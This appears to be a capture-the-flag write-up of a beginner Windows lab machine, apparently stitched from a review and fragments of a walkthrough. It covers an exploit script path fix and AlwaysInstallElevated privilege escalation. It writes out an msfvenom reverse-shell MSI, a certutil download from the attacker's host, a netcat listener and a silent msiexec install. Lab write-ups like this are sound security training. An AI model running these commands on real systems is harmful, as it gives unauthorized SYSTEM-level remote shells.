## Review

A beginner-friendly Windows box that chains a web SSRF into credential disclosure, then a known CVE in an open source PHP app for the foothold, and finishes with a classic AlwaysInstallElevated privilege escalation.

**Personal Rating:** ⭐⭐⭐ (3/5)

**Recommended for:** Beginners looking to practice SSRF, vhost enumeration, exploiting known CVEs in third party web apps, and basic Windows privilege escalation.

Found the problem, the script has some variables that describe paths, but they are not the right ones for our machine.
Example: http://10.129.48.103/votesystem/admin/login.php -> 404

From our first ffuf scan we saw the path "admin" directly from the root, so we need to drop "votesystem" from the URLs.

```python
INDEX_PAGE = f"http://{IP}/admin/index.php"

```

### Privilege Escalation - AlwaysInstallElevated

Let's enumerate the machine for root.
Note: I was about to just put the whole enumeration process here, but since I follow my checklist and in this case the right path was found at the end of it, I will just put the commands I used to enumerate this type of vulnerability so that you can eventually add them to your checklist.

```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer  
   AlwaysInstallElevated    REG_DWORD    0x1
   
   
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer  
   AlwaysInstallElevated    REG_DWORD    0x1
```

When both of these policies are set to true, like in this case, it means that every .MSI we install will be run as SYSTEM. It's a low hanging fruit that is always worth checking.

```bash
#Crafting a payload with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.122 LPORT=9001 -f msi -o shell.msi

#Making the file available (HTTP server port)
python3 -m http.server 9999

#Opening another nc listener in another terminal (must match the msi LPORT, 9001)
nc -lvnp 9001

#From the target machine
certutil -urlcache -split -f http://10.10.14.122:9999/shell.msi shell.msi
msiexec /quiet /qn /i C:\Users\Phoebe\Desktop\shell.msi
```
